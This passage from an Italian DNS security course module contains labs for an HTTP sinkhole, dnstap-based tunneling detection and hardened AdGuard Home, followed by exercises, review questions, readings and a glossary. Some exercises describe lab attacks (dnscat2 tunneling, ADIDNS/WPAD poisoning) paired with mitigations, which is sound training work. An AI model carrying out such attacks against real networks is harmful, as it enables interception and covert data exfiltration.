            body = self.rfile.read(content_length)
            entry = {
                "timestamp": datetime.now(timezone.utc).isoformat(),
                "src_ip": self.client_address[0],
                "type": "POST_BODY",
                "body_hex": body.hex()[:512],  # Primi 256 byte in hex
                "body_size": content_length,
            }
            logging.info(json.dumps(entry))
        self.send_response(200)
        self.end_headers()

    def log_message(self, format, *args) -> None:
        """Sopprimere il log di default su stderr."""
        pass


if __name__ == "__main__":
    port = int(sys.argv[1]) if len(sys.argv) > 1 else 80
    server = HTTPServer(("0.0.0.0", port), SinkholeHandler)
    print(f"Sinkhole HTTP attivo su porta {port}")
    server.serve_forever()
PYEOF

chmod +x /opt/sinkhole/http_sinkhole.py

# Systemd unit per il sinkhole
cat > /etc/systemd/system/sinkhole-http.service << 'UNITEOF'
[Unit]
Description=DNS Sinkhole HTTP Server
After=network.target

[Service]
Type=simple
ExecStart=/usr/bin/python3 /opt/sinkhole/http_sinkhole.py 80
Restart=always
RestartSec=5
User=sinkhole
Group=sinkhole
ReadWritePaths=/var/log/sinkhole

[Install]
WantedBy=multi-user.target
UNITEOF

# Creare utente dedicato
useradd -r -s /usr/sbin/nologin sinkhole 2>/dev/null || true
chown -R sinkhole:sinkhole "${LOG_DIR}"

systemctl daemon-reload
systemctl enable --now sinkhole-http.service

echo "[+] Sinkhole server attivo su ${SINKHOLE_IP}:80"
echo "[+] Log delle connessioni: ${LOG_DIR}/http_connections.jsonl"
echo "[+] Configurare RPZ per redirigere domini malevoli a ${SINKHOLE_IP}"
```

### Lab 8 — DNS Monitoring con dnstap e Analisi Real-Time

```bash
#!/bin/bash
# lab-dnstap-monitor.sh — Setup dnstap monitoring con analisi real-time
# Richiede: Unbound con dnstap abilitato, golang-dnstap

# Installare il tool dnstap
go install github.com/dnstap/golang-dnstap/dnstap@latest

# Configurare Unbound per dnstap (aggiungere a unbound.conf)
cat >> /etc/unbound/unbound.conf << 'CONF'

dnstap:
    dnstap-enable: yes
    dnstap-socket-path: "/var/run/unbound/dnstap.sock"
    dnstap-send-identity: yes
    dnstap-send-version: yes
    dnstap-log-resolver-query-messages: yes
    dnstap-log-resolver-response-messages: yes
    dnstap-log-client-query-messages: yes
    dnstap-log-client-response-messages: yes
CONF

# Riavviare Unbound
systemctl restart unbound

# Script Python per analisi real-time del feed dnstap
cat > /opt/dns-monitor/dnstap_analyzer.py << 'PYEOF'
#!/usr/bin/env python3
"""Analisi real-time del feed dnstap da Unbound.

Legge l'output testuale di golang-dnstap da stdin
e produce alert per pattern sospetti.
"""

import sys
import re
from collections import defaultdict
from datetime import datetime, timezone


# Contatori per finestra temporale
query_counter: dict[str, int] = defaultdict(int)
domain_counter: dict[str, set] = defaultdict(set)
nxdomain_counter: dict[str, int] = defaultdict(int)

# Soglie
QUERY_RATE_THRESHOLD = 200        # query/minuto per client
UNIQUE_SUBDOMAIN_THRESHOLD = 100  # subdomain unici per parent domain
NXDOMAIN_THRESHOLD = 50           # NXDOMAIN/minuto per client

for line in sys.stdin:
    line = line.strip()
    if not line:
        continue

    # Parsing base dell'output dnstap
    # Formato: timestamp type src_ip query_name query_type rcode
    parts = line.split()
    if len(parts) < 5:
        continue

    timestamp = parts[0]
    msg_type = parts[1] if len(parts) > 1 else ""
    src_ip = parts[2] if len(parts) > 2 else ""
    query_name = parts[3] if len(parts) > 3 else ""
    query_type = parts[4] if len(parts) > 4 else ""

    # Contare query per client
    query_counter[src_ip] += 1

    # Tracciare subdomain unici
    labels = query_name.split(".")
    if len(labels) >= 3:
        parent = ".".join(labels[-2:])
        subdomain = ".".join(labels[:-2])
        domain_counter[f"{src_ip}|{parent}"].add(subdomain)

        # Check tunneling
        unique_count = len(domain_counter[f"{src_ip}|{parent}"])
        if unique_count == UNIQUE_SUBDOMAIN_THRESHOLD:
            now = datetime.now(timezone.utc).isoformat()
            print(
                f"[ALERT] {now} TUNNEL_SUSPECT "
                f"client={src_ip} parent={parent} "
                f"unique_subdomains={unique_count}",
                flush=True
            )

    # Check rate
    if query_counter[src_ip] % QUERY_RATE_THRESHOLD == 0:
        now = datetime.now(timezone.utc).isoformat()
        print(
            f"[ALERT] {now} HIGH_QUERY_RATE "
            f"client={src_ip} "
            f"total_queries={query_counter[src_ip]}",
            flush=True
        )
PYEOF

chmod +x /opt/dns-monitor/dnstap_analyzer.py

echo "[+] Per avviare il monitoring:"
echo "    dnstap -u /var/run/unbound/dnstap.sock | python3 /opt/dns-monitor/dnstap_analyzer.py"
```

### Lab 9 — AdGuard Home con DoH/DoT e Filtering Avanzato

```yaml
# docker-compose.yml — AdGuard Home con configurazione sicura
services:
  adguard:
    image: adguard/adguardhome:v0.108.0
    container_name: adguard-home
    ports:
      - "10.0.0.10:53:53/tcp"
      - "10.0.0.10:53:53/udp"
      - "10.0.0.10:853:853/tcp"     # DoT
      - "10.0.0.10:443:443/tcp"     # DoH
      - "10.0.0.10:3000:3000/tcp"   # Web UI (solo setup iniziale)
    volumes:
      - ./adguard/work:/opt/adguardhome/work
      - ./adguard/conf:/opt/adguardhome/conf
      - ./adguard/certs:/opt/adguardhome/certs:ro
    restart: unless-stopped
    networks:
      dns_lab:
        ipv4_address: 10.0.0.10

networks:
  dns_lab:
    driver: bridge
    ipam:
      config:
        - subnet: 10.0.0.0/24
```

```yaml
# adguard/conf/AdGuardHome.yaml — configurazione sicura
dns:
  bind_hosts:
    - 0.0.0.0
  port: 53

  # Upstream resolver crittografato
  upstream_dns:
    - tls://dns.quad9.net
    - tls://cloudflare-dns.com
  upstream_mode: parallel

  # Bootstrap DNS per risolvere i nomi degli upstream
  bootstrap_dns:
    - 9.9.9.9
    - 1.1.1.1

  # DNSSEC validation
  enable_dnssec: true

  # Protezione DNS rebinding
  rebind_protection_enabled: true

  # Bloccare risposte con IP privati da query esterne
  private_networks: []

  # Rate limiting
  ratelimit: 100
  ratelimit_subnet_len_ipv4: 24
  ratelimit_subnet_len_ipv6: 56

  # Cache
  cache_size: 67108864  # 64 MB
  cache_ttl_min: 0
  cache_ttl_max: 86400

  # Statistiche e logging
  statistics_interval: 7  # giorni

filtering:
  # Blocklist curate
  filtering_enabled: true
  filters:
    - name: AdGuard DNS filter
      url: https://adguardteam.github.io/HostlistsRegistry/assets/filter_1.txt
      enabled: true
    - name: Malware domains
      url: https://adguardteam.github.io/HostlistsRegistry/assets/filter_11.txt
      enabled: true
    - name: Phishing domains
      url: https://adguardteam.github.io/HostlistsRegistry/assets/filter_30.txt
      enabled: true
    - name: Abuse.ch URLhaus
      url: https://urlhaus.abuse.ch/downloads/hostfile/
      enabled: true

tls:
  enabled: true
  server_name: dns.lab.local
  port_https: 443
  port_dns_over_tls: 853
  port_dns_over_quic: 853
  certificate_path: /opt/adguardhome/certs/server.crt
  private_key_path: /opt/adguardhome/certs/server.key
  # Richiedere TLS 1.2+
  strict_sni_check: true

# Per-client filtering (esempio)
clients:
  persistent:
    - name: IoT-Network
      ids:
        - 10.0.10.0/24
      filtering_enabled: true
      use_global_blocked_services: true
      blocked_services:
        schedule:
          time_zone: Europe/Rome
        ids: []
    - name: Guest-Network
      ids:
        - 10.0.20.0/24
      filtering_enabled: true
      parental_enabled: true
      safesearch_enabled: true
```

---

## Esercizi

1. **Lab BIND hardening.** Deployare BIND con la configurazione hardened dalla sezione 7. Verificare che la recursion funzioni solo per i client nella ACL `trusted-nets`. Tentare un zone transfer da un IP non autorizzato e verificare il rifiuto.

2. **Lab DNSSEC end-to-end.** Seguire il Lab 2 per firmare una zona. Verificare la validazione con `delv @resolver lab.local A +rtrace`. Corrompere intenzionalmente un record e verificare che la validazione fallisca con SERVFAIL.

3. **Lab DNS tunneling detection.** Eseguire il Lab 3 (dnscat2) e il Lab 4 (Zeek + Suricata) simultaneamente. Documentare ogni alert generato, il delay di detection, e i falsi negativi osservati. Calibrare le soglie degli script di detection.

4. **Lab RPZ.** Configurare una RPZ zone su BIND con almeno 10 domini bloccati. Verificare il blocco con `dig`. Configurare un redirect a una warning page per 3 domini. Automatizzare l'aggiornamento RPZ da un feed esterno con un cron job.

5. **Lab pipeline ELK.** Seguire il Lab 6 per deployare la pipeline completa. Generare traffico DNS misto (legittimo + DGA + tunneling) e costruire un dashboard Kibana che distingua le tre categorie. Calcolare precision e recall della detection.

6. **Lab ADIDNS poisoning.** In un lab Active Directory, creare un record WPAD via LDAP come domain user non privilegiato. Verificare che i client risolvano il record malevolo. Implementare la mitigazione (pre-registrazione + ACL restriction) e verificare che l'attacco non sia piu' possibile.

---

## Auto-valutazione

1. Descrivere il processo di risoluzione DNS ricorsiva step by step, identificando i punti di attacco a ciascun livello.
2. Spiegare la differenza tra Kaminsky attack e SAD DNS in termini di side-channel utilizzato.
3. Perche' il DNS tunneling e' difficile da bloccare in ambienti che permettono DoH?
4. Descrivere la catena crittografica DNSSEC dalla root alla zona target, specificando il ruolo di KSK, ZSK, DS, e RRSIG.
5. Qual e' il tradeoff fondamentale tra DoH e visibilita' enterprise?
6. Come funziona l'NSEC walking e perche' NSEC3 e' solo una mitigazione parziale?
7. Descrivere l'attacco ADIDNS poisoning: prerequisiti, meccanismo, e mitigazione.
8. Quali metriche statistiche distinguono il traffico DNS tunneling dal traffico legittimo?
9. Progettare una pipeline di DNS threat intelligence per un SOC: componenti, flussi dati, azioni automatiche.
10. Confrontare RPZ vs DNS sinkholing: vantaggi, svantaggi, e casi d'uso.

---

## Letture primarie

- RFC 1034/1035 — Domain Names (Concepts / Implementation). https://www.rfc-editor.org/rfc/rfc1034
- RFC 4033/4034/4035 — DNSSEC. https://www.rfc-editor.org/rfc/rfc4033
- RFC 5155 — NSEC3. https://www.rfc-editor.org/rfc/rfc5155
- RFC 7858 — DNS over TLS. https://www.rfc-editor.org/rfc/rfc7858
- RFC 8484 — DNS over HTTPS. https://www.rfc-editor.org/rfc/rfc8484
- RFC 6891 — EDNS0. https://www.rfc-editor.org/rfc/rfc6891
- RFC 5452 — DNS Resilience against Forged Answers. https://www.rfc-editor.org/rfc/rfc5452
- Kaminsky, D. — "Black Ops of DNS" (Black Hat 2008). https://www.blackhat.com/presentations/bh-dc-08/Kaminsky/Presentation/bh-dc-08-kaminsky.pdf
- Man, K. et al. — "DNS Cache Poisoning Attack Reloaded: Revolutions with Side Channels" (ACM CCS 2020). CVE-2020-25705.
- ISC BIND Security Advisories. https://www.isc.org/bind/
- NLnet Labs Unbound Documentation. https://unbound.docs.nlnetlabs.nl/
- Farsight Security / DomainTools DNSDB. https://www.domaintools.com/products/dnsdb
- Zeek DNS Protocol Analyzer. https://docs.zeek.org/en/master/scripts/base/protocols/dns/main.zeek.html

---

## Collegamenti incrociati

- Modulo 04 — `04-servizi-infrastruttura.md` — servizi di rete e DNS base.
- Modulo 05 — `05-sicurezza-operativa.md` — sicurezza operativa, IDS/IPS, firewall.
- Modulo 07 — `07-monitoraggio-incidenti.md` — monitoring e incident response.
- Modulo 11 — `11-troubleshooting-generale.md` — troubleshooting di rete e servizi.

---

## Glossario locale

| Termine | Definizione |
|---|---|
| **TXID** | Transaction ID — identificatore a 16 bit nelle query/risposte DNS. |
| **RRL** | Response Rate Limiting — limitazione delle risposte per mitigare DDoS. |
| **RPZ** | Response Policy Zone — zona DNS che sovrascrive risposte in base a policy. |
| **DGA** | Domain Generation Algorithm — algoritmo che genera domini pseudo-casuali per C2. |
| **Fast-flux** | Tecnica che ruota rapidamente gli IP associati a un dominio. |
| **DoH** | DNS over HTTPS — query DNS incapsulate in HTTPS (porta 443). |
| **DoT** | DNS over TLS — query DNS crittografate con TLS (porta 853). |
| **ECH** | Encrypted Client Hello — estensione TLS che crittografa l'SNI. |
| **ZSK** | Zone Signing Key — chiave DNSSEC per firmare i record della zona. |
| **KSK** | Key Signing Key — chiave DNSSEC per firmare il DNSKEY RRset. |
| **DS** | Delegation Signer — hash della KSK nella zona parent. |
| **RRSIG** | Resource Record Signature — firma crittografica di un RRset. |
| **NSEC/NSEC3** | Record per denial of existence autenticata in DNSSEC. |
| **ADIDNS** | Active Directory Integrated DNS — zone DNS memorizzate in LDAP. |
| **GSS-TSIG** | Generic Security Service — Transaction Signature per dynamic updates sicure. |
| **NRD** | Newly Registered Domain — dominio registrato di recente, indicatore di rischio. |
| **Sinkhole** | Server che cattura traffico rediretto da domini malevoli. |
| **EDNS0** | Extension Mechanisms for DNS — estende il protocollo oltre 512 byte UDP. |
| **ECS** | EDNS Client Subnet — opzione EDNS0 che espone la subnet del client. |
| **Cache poisoning** | Inserimento di record DNS falsi nella cache di un resolver. |
| **Open resolver** | Recursive resolver che accetta query da qualsiasi sorgente. |
| **DNS rebinding** | Attacco che bypassa SOP cambiando la risoluzione DNS dopo il primo accesso. |
| **Water torture** | Random subdomain flood attack contro un dominio target. |
| **dnstap** | Protocollo binario ad alte prestazioni per DNS logging. |
| **Split-horizon** | Architettura DNS che serve risposte diverse in base alla sorgente. |
